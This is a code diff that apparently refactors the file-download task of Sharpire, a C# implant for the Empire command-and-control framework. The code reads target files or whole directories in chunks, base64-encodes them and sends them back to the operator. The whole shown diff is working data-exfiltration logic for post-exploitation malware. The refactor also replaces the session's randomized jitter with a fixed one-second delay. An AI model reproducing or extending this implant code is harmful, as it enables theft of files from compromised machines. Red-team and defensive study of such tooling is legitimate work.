@@ -371,117 +371,87 @@ namespace Sharpire
         {
             try
             {
+                if (string.IsNullOrEmpty(packet.data) || packet.data.Trim().Length == 0)
+                    return EncodePacket(0, "Invalid input data", packet.taskId);
+
                 int chunkSize = 512 * 1024;
-                string[] packetParts = packet.data.Split(' ');
-                string path = "";
-                if (packetParts.Length > 1)
+                string[] packetParts = packet.data.Trim().Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
+                string path = ParsePath(packetParts, out bool isChunkSizeAdjusted);
+
+                if (isChunkSizeAdjusted)
                 {
-                    path = string.Join(" ", packetParts.Take(packetParts.Length - 2).ToArray());
-                    try
-                    {
-                        chunkSize = Convert.ToInt32(packetParts[packetParts.Length - 1]) / 1;
-                        if (packetParts[packetParts.Length - 1].Contains('b'))
-                        {
-                            chunkSize = chunkSize * 1024;
-                        }
-                    }
-                    catch
-                    {
-                        path += " " + packetParts[packetParts.Length - 1];
-                    }
-                }
-                else
-                {
-                    path = packet.data;
-                }
-                path = path.Trim('\"').Trim('\'');
-                if (chunkSize < 64 * 1024)
-                {
-                    chunkSize = 64 * 1024;
-                }
-                else if (chunkSize > 8 * 1024 * 1024)
-                {
-                    chunkSize = 8 * 1024 * 1024;
+                    chunkSize = AdjustChunkSize(packetParts.Last());
                 }
 
-                var files = new List<FileInfo>();
-                DirectoryInfo directoryInfo;
-                if (File.Exists(path))
-                {
-                    string filename = path.Split('\\').Last();
-                    string dir = path.Replace("\\" + filename, "");
-    
-                    directoryInfo = new DirectoryInfo(dir);
-                    FileInfo[] fileInfo = directoryInfo.GetFiles(filename);
-                    foreach(FileInfo f in fileInfo)
-                    {
-                        files.Add(f);
-                    }
-                }
-                else if (Directory.Exists(path))
-                {
-                    directoryInfo = new DirectoryInfo(path);
-                    FileInfo[] fileInfo = directoryInfo.GetFiles();
-                    foreach(FileInfo f in fileInfo)
-                    {
-                        files.Add(f);
-                    }
-                }
-               
+                chunkSize = Math.Max(64 * 1024, Math.Min(chunkSize, 8 * 1024 * 1024));
+
+                var files = GetTargetFiles(path);
                 if (files.Count == 0)
-                {
                     return EncodePacket(0, "[!] File does not exist or cannot be accessed", packet.taskId);
-                }
 
-                foreach (FileInfo currentFileInfo in files)
+                foreach (FileInfo file in files)
                 {
-                    int index = 0;
-                    string filePart = "";
-                    do
-                    {
-                        byte[] filePartBytes = Agent.GetFilePart(currentFileInfo.FullName, index, chunkSize);
-                        filePart = Convert.ToBase64String(filePartBytes);
-                        if (filePart.Length > 0)
-                        {
-                            string data = index.ToString() + "|" + currentFileInfo.FullName + "|" + currentFileInfo.Length + "|" + filePart;
-                            SendMessage(EncodePacket(packet.type, data, packet.taskId));
-                            index++;
-                            if (sessionInfo.GetDefaultDelay() != 0)
-                            {
-                                int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
-                                if (max > int.MaxValue)
-                                {
-                                    max = int.MaxValue - 1;
-                                }
-
-                                int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
-                                if (min < 0)
-                                {
-                                    min = 0;
-                                }
-
-                                int sleepTime;
-                                if (min == max)
-                                {
-                                    sleepTime = min;
-                                }
-                                else
-                                {
-                                    Random random = new Random();
-                                    sleepTime = random.Next(min, max);
-                                }
-                                Thread.Sleep(sleepTime);
-                            }
-                            GC.Collect();
-                        }
-                    } while (filePart.Length != 0); 
+                    SendFileInChunks(file, chunkSize, packet);
                 }
+
                 return EncodePacket(40, "[*] File download of " + path + " completed", packet.taskId);
             }
-            catch 
+            catch (Exception ex)
             {
-                return EncodePacket(0, "[!] File does not exist or cannot be accessed", packet.taskId);
+                return EncodePacket(0, $"[!] Error: {ex.Message}", packet.taskId);
             }
+        }
+
+
+        private string ParsePath(string[] parts, out bool isChunkSizeAdjusted)
+        {
+            isChunkSizeAdjusted = false;
+            if (parts.Length > 1 && int.TryParse(parts.Last().TrimEnd('b', 'B'), out int _))
+            {
+                isChunkSizeAdjusted = true;
+                return string.Join(" ", parts.Take(parts.Length - 1).ToArray()).Trim('\"', '\'');
+            }
+            return string.Join(" ", parts).Trim('\"', '\'');
+        }
+
+
+        private int AdjustChunkSize(string lastPart)
+        {
+            bool isKb = lastPart.EndsWith("b", StringComparison.OrdinalIgnoreCase);
+            int size = Convert.ToInt32(lastPart.TrimEnd('b', 'B'));
+            return isKb ? size * 1024 : size;
+        }
+
+        private List<FileInfo> GetTargetFiles(string path)
+        {
+            var files = new List<FileInfo>();
+            if (File.Exists(path))
+            {
+                files.Add(new FileInfo(path));
+            }
+            else if (Directory.Exists(path))
+            {
+                files.AddRange(new DirectoryInfo(path).GetFiles());
+            }
+            return files;
+        }
+
+        private void SendFileInChunks(FileInfo fileInfo, int chunkSize, PACKET packet)
+        {
+            int index = 0;
+            do
+            {
+                byte[] filePartBytes = Agent.GetFilePart(fileInfo.FullName, index, chunkSize);
+                if (filePartBytes.Length == 0) break;
+
+                string filePart = Convert.ToBase64String(filePartBytes);
+                string data = $"{index}|{fileInfo.FullName}|{fileInfo.Length}|{filePart}";
+                SendMessage(EncodePacket(packet.type, data, packet.taskId));
+                index++;
+                int delay = 1000;
+                Thread.Sleep(delay);
+
+            } while (true);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
